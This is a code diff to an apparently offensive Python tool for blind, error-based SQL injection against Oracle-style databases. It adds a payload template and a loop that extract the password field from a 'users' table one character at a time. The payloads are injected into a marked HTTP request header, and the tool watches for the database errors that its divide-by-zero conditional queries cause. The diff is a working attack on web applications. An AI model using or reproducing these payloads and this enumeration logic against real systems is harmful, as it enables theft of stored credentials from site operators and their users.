@@ -48,14 +48,16 @@ SQL = {
     'CONDITIONAL_SUBSTRING_ENUM': "' || (SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE $columnName='$columnValue')||",
     'TABLE_CHECK': "' || (SELECT '' FROM $tableName) || '",
     'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
-    'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH(password)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
+    'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH(password)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
+    'VALUE_CHECK': "' || (SELECT CASE WHEN SUBSTR(password, $currentIndex, 1)='$currentValue' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
 }
 ORACLE = {
     'BASIC': "' || (SELECT '' from dual) || '",
     'CONDITIONAL_SUBSTRING_ENUM': "' || (SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE $columnName='$columnValue')||",
     'TABLE_CHECK': "' || (SELECT '' FROM $tableName WHERE ROWNUM = 1) || '",
     'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
-    'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH(password)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
+    'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH(password)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'",
+    'VALUE_CHECK': "' || (SELECT CASE WHEN SUBSTR(password, $currentIndex, 1)='$currentValue' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
 }
 
 args = parser.parse_args()
@@ -71,7 +73,7 @@ except FileNotFoundError:
     error("Wordlist does not exists!")
 else:
     values = wlFile.read()
-    payloadValues = values.split(',')
+    payloadValues = values.split('\n')
     wlFile.close()
 
 try:
@@ -90,7 +92,11 @@ protocol = "https://" if args.ssl else "http://"
 headers = dict(message.items())
 url = f"{protocol}{headers['Host']}{request_line.replace('GET ', '').replace(' HTTP/1.1', '')}"
 dbVersion = "UNKNOWN"
-length_index = 0
+
+field_length = 0
+current_value = 0
+current_index = 0
+enumerated_value = ""
 
 
 def isSqlCompatible():
@@ -135,10 +141,10 @@ def checkRowExists(tableName, columnName, columnValue):
 
 
 def enumerateFieldLength(tableName, columnName, columnValue):
-    global length_index
+    global field_length
     print("Getting field length...")
     for x in range(FIELD_LENGTH_LIMIT):
-        length_index = x
+        field_length = x
 
         inject("LENGTH_CHECK")
 
@@ -148,16 +154,34 @@ def enumerateFieldLength(tableName, columnName, columnValue):
     return False
 
 
+def enumerateFieldValue(tableName, columnName, columnValue):
+    global field_length
+    global current_index
+    global current_value
+    global enumerated_value
+
+    print("Enumerating field values...")
+
+    for x in range(field_length):
+        current_index = x+1
+
+        for val in payloadValues:
+            current_value = val
+
+            inject("VALUE_CHECK")
+
+            if executeRequestAndReturnsError():
+                enumerated_value += val
+
+
 def inject(sqlKey, autolookup=True):
     global headers
 
     orgSql = getSQLCommand(sqlKey) if autolookup else sqlKey
     sql = Template(orgSql)
 
-    test = length_index
-
     safeSql = sql.safe_substitute(
-        tableName=tableName, columnName=columnName, columnValue=columnValue, lengthTndex=length_index)
+        tableName=tableName, columnName=columnName, columnValue=columnValue, lengthTndex=field_length, currentIndex=current_index, currentValue=current_value)
 
     for header, value in message.items():
         if MARKER in value:
@@ -201,3 +225,6 @@ else:
     print(f"Entry has {columnName}={columnValue}")
 
 enumerateFieldLength(tableName, columnName, columnValue)
+enumerateFieldValue(tableName, columnName, columnValue)
+
+print(f"Enumerated field's value is {enumerated_value}")
